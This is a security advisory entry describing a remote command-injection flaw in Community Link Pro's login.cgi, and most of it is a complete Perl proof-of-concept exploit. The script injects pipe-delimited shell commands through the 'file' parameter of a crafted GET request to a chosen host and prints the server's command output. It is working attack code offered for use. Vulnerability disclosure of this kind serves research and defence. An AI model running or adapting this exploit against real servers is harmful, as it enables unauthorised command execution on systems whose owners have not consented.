source: http://www.securityfocus.com/bid/14097/info

Community Link Pro is prone to a remote arbitrary command execution vulnerability. This issue presents itself due to insufficient sanitization of user-supplied data.

Due to this, an attacker can prefix arbitrary commands with the '|' character and have them executed in the context of the server. 

#!/usr/bin/perl
# ___                 ___                     __
# \_ |__ _____     __| _/______  ____   _____/  |_
#  | __ \\__  \   / __ |\_  __ \/  _ \ /  _ \   __\
#  | \_\ \/ __ \_/ /_/ | |  | \(  <_> |  <_> )  |
#  |___  (____  /\____ | |__|   \____/ \____/|  | Security Group
#      \/     \/      \/                      ||
#                                             \/
# Login.cgi Remote Command Execution PoC Exploit
# by: spher3 - spher3@fatalimpulse.net
# www.badroot.org

use strict;
use IO::Socket::INET;

sub USAGE()
{
  print "USAGE:\n",
        "perl $0 [host] [path] [cmd]\n\n",
        "EXAMPLE:\n",
        "perl www.site.org /webeditor/ \"uname -a\"\n\n";
  exit 0;
}

USAGE unless $ARGV[2];

my $host = $ARGV[0];

my $path = $ARGV[1];

my $cmds = join  (  '%20', split  (  / /, $ARGV[2]  )  );

my $vuln = $path . "login.cgi?username=&command=simple&do=edit&password=&file=|" . $cmds . "|";

print  "Badroot Security Group - www.badroot.org\n", 
       "Login.cgi Remote Command Execution\n\n",
       "- Target: $host\n",
       "- Path: $path\n\n"; 

my $sock = IO::Socket::INET->new  (  PeerAddr => $host,
                                     PeerPort => 80,
                                     Proto => "tcp",
                                     Type => SOCK_STREAM  ) || die "Error: $!\n";

print $sock "GET " . $vuln ." HTTP/1.1\n\r",
            "Accept: */*\r\n",
            "User-Agent: Bad\r\n", 
            "Host: $host\r\n",
            "Connection: Keep-Alive\r\n\r\n";             

my $lE = 0;

while  (  <$sock>  )
{

  if (  $_ =~ /<\/textarea/  )
  {
    $lE = 0;
    close  (  $sock  ) && exit 0;
  }
  
  print $_ if $lE == 2;

  ++$lE if $lE == 1;

  if (  $_ =~ /<textarea/  )
  {
    ++$lE;
  }

} 